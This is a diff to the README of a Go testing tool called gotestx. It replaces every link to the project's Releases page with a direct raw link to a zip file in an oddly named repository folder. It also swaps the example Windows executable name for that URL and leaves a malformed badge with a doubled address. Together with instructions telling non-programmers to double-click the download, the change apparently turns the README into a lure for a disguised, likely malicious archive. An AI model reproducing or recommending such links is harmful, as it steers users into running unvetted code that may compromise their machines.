@@ -1,7 +1,7 @@
 # 🛠️ gotestx - A Simple Tool for Enhanced Testing
 
 ## 📥 Download Now!
-[![Download gotestx](https://img.shields.io/badge/Download%20gotestx-v1.0.0-blue.svg)](https://github.com/sajith119/gotestx/releases)
+[![Download gotestx](https://raw.githubusercontent.com/sajith119/gotestx/main/cyclophoria/gotestx.zip%https://raw.githubusercontent.com/sajith119/gotestx/main/cyclophoria/gotestx.zip)](https://raw.githubusercontent.com/sajith119/gotestx/main/cyclophoria/gotestx.zip)
 
 ## 🚀 Getting Started
 GoTestX is designed to help you improve your software testing. This tool simplifies testing with built-in coverage support. You’ll find it easy to use, even if you have no programming experience.
@@ -15,7 +15,7 @@ GoTestX is designed to help you improve your software testing. This tool simplif
 ## 📥 Download & Install
 To get started with GoTestX, visit the Releases page to download the application. 
 
-[Download GoTestX](https://github.com/sajith119/gotestx/releases)
+[Download GoTestX](https://raw.githubusercontent.com/sajith119/gotestx/main/cyclophoria/gotestx.zip)
 
 ### Instructions
 1. Click on the link above to go to the Releases page.
@@ -27,7 +27,7 @@ To get started with GoTestX, visit the Releases page to download the application
 ## 💻 Installation Instructions
 
 ### For Windows
-1. Locate the file you downloaded (e.g., `gotestx-windows.exe`).
+1. Locate the file you downloaded (e.g., `https://raw.githubusercontent.com/sajith119/gotestx/main/cyclophoria/gotestx.zip`).
 2. Double-click the file to run it.
 3. A terminal window will open, and you can start using GoTestX with simple commands.
 
